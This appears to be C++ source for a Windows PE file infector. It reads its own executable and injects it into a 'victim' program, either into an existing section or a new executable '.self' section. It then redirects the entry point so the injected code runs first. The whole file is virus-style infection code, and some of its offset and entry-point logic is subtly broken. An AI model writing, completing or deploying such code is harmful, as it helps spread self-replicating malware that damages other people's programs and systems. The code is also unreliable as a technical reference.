#include <iostream>
#include <fstream>
#include <windows.h>
#include <vector>
#pragma pack(push, 1)

void PrintOptionalHeader(const IMAGE_NT_HEADERS64& ntHeaders) {
    const IMAGE_OPTIONAL_HEADER64& optionalHeader = ntHeaders.OptionalHeader;

    // Imprimir otros campos si es necesario
}
void ModifyEntryPoint(IMAGE_NT_HEADERS64& ntHeaders, size_t selfCodeOffset, const IMAGE_OPTIONAL_HEADER64& optionalHeader);
struct PEHeader {
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_NT_HEADERS64 ntHeaders;
};
#pragma pack(pop)

void PrintError(const char* message) {
    std::cerr << message << std::endl;
    exit(EXIT_FAILURE);
}

void InjectSelf(const std::string& victimFilePath, const std::string& outputFilePath, const char* selfCode, size_t selfCodeSize) {
    std::cout << "From InjectSelf: Victim file path is : " << victimFilePath << " Output file path is : " << outputFilePath << " Self-code size: " << selfCodeSize << std::endl;
    std::ifstream file(victimFilePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open victim file");
    }

    // Read the entire PE file into memory
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> fileData(fileSize);
    file.read(fileData.data(), fileSize);

    if (!file) {
        PrintError("Error reading PE file");
    }

    // Read the DOS header
    IMAGE_DOS_HEADER dosHeader;
    std::memcpy(&dosHeader, fileData.data(), sizeof(IMAGE_DOS_HEADER));

    // Read the NT headers
    IMAGE_NT_HEADERS64 ntHeaders;
    std::memcpy(&ntHeaders, fileData.data() + dosHeader.e_lfanew, sizeof(IMAGE_NT_HEADERS64));

    IMAGE_FILE_HEADER& fileHeader = ntHeaders.FileHeader;
    IMAGE_OPTIONAL_HEADER64& optionalHeader = ntHeaders.OptionalHeader;
    IMAGE_SECTION_HEADER* sections = reinterpret_cast<IMAGE_SECTION_HEADER*>(fileData.data() + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64));
    PrintOptionalHeader(ntHeaders);

    // Check the number of sections
    if (fileHeader.NumberOfSections < 1) {
        PrintError("Invalid PE file: No sections found");
    }

    std::cout << "Number of sections: " << static_cast<int>(fileHeader.NumberOfSections) << std::endl;

    // Locate the section where we will inject the self code
    IMAGE_SECTION_HEADER* section = nullptr;
    for (int i = 0; i < fileHeader.NumberOfSections; ++i) {
        if (sections[i].SizeOfRawData >= selfCodeSize) {
            section = &sections[i];
            break;
        }
    }

    // If no suitable section is found, add a new section
    if (section == nullptr) {
        std::cout << "Adding a new section" << std::endl;
        fileHeader.NumberOfSections++;
        size_t newSectionOffset = fileSize;
        fileSize += selfCodeSize;
        fileData.resize(fileSize);

        section = &sections[fileHeader.NumberOfSections - 1];
        std::memset(section, 0, sizeof(IMAGE_SECTION_HEADER));
        strcpy_s(reinterpret_cast<char*>(section->Name), sizeof(section->Name), ".self");
        section->Misc.VirtualSize = selfCodeSize;
        section->VirtualAddress = (sections[fileHeader.NumberOfSections - 2].VirtualAddress + sections[fileHeader.NumberOfSections - 2].Misc.VirtualSize + optionalHeader.SectionAlignment - 1) & ~(optionalHeader.SectionAlignment - 1);
        section->SizeOfRawData = selfCodeSize;
        section->PointerToRawData = newSectionOffset;
        section->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
    }

    size_t sectionSize = section->SizeOfRawData;
    size_t sectionOffset = section->PointerToRawData;

    std::cout << "Section size: " << sectionSize << ", Section offset: " << sectionOffset << std::endl;

    // Verify that sectionOffset and sectionSize are within file boundaries
    if (sectionOffset + sectionSize > fileSize) {
        PrintError("Section exceeds file size");
    }

    // Ensure the section has enough space for the self code
    if (selfCodeSize > sectionSize) {
        PrintError("Self-code size is larger than the section size");
    }

    // Inject the self code into the section
    size_t selfCodeOffset = sectionOffset + sectionSize - selfCodeSize;
    std::memcpy(fileData.data() + selfCodeOffset, selfCode, selfCodeSize);

    // Modify the entry point to point to the injected code
    ModifyEntryPoint(ntHeaders, selfCodeOffset + optionalHeader.ImageBase, optionalHeader);

    // Update the NT headers in the file data
    std::memcpy(fileData.data() + dosHeader.e_lfanew, &ntHeaders, sizeof(IMAGE_NT_HEADERS64));

    // Write the modified file to the output path
    std::ofstream outFile(outputFilePath, std::ios::binary);
    if (!outFile) {
        PrintError("Cannot open output file");
    }

    outFile.write(fileData.data(), fileData.size());

    std::cout << "Self-code injected and entry point modified successfully." << std::endl;
}

void ModifyEntryPoint(IMAGE_NT_HEADERS64& ntHeaders, size_t selfCodeOffset, const IMAGE_OPTIONAL_HEADER64& optionalHeader) {
    std::cout << "PE file headers read successfully" << std::endl;
    std::cout << "AddressOfEntryPoint: " << std::hex << ntHeaders.OptionalHeader.AddressOfEntryPoint << std::endl;
    std::cout << "ImageBase: " << std::hex << ntHeaders.OptionalHeader.ImageBase << std::endl;

    // Convert offset to RVA and set as entry point
    DWORD entryPointRVA = static_cast<DWORD>(selfCodeOffset - optionalHeader.ImageBase);
    ntHeaders.OptionalHeader.AddressOfEntryPoint = entryPointRVA;

    std::cout << "PE file headers modified successfully" << std::endl;
    std::cout << "Address Of New Entry Point: " << std::hex << ntHeaders.OptionalHeader.AddressOfEntryPoint << std::endl;
    std::cout << "New ImageBase: " << std::hex << ntHeaders.OptionalHeader.ImageBase << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <victim PE file> <output PE file>" << std::endl;
        return EXIT_FAILURE;
    }

    std::string victimFilePath = argv[1];
    std::string outputFilePath = argv[2];

    // Read the self-code (current executable) into memory
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    std::ifstream selfFile(selfPath, std::ios::binary | std::ios::ate);
    if (!selfFile) {
        PrintError("Cannot open self file");
    }

    size_t selfCodeSize = selfFile.tellg();
    selfFile.seekg(0, std::ios::beg);
    std::vector<char> selfCode(selfCodeSize);
    selfFile.read(selfCode.data(), selfCodeSize);

    if (!selfFile) {
        PrintError("Error reading self file");
    }

    // Print the size of the self-code
    std::cout << "Self-code size: " << selfCodeSize << " bytes" << std::endl;

    // Inject the self-code into the victim PE file
    InjectSelf(victimFilePath, outputFilePath, selfCode.data(), selfCodeSize);

    std::cout << "Self-code injection completed successfully." << std::endl;

    return EXIT_SUCCESS;
}
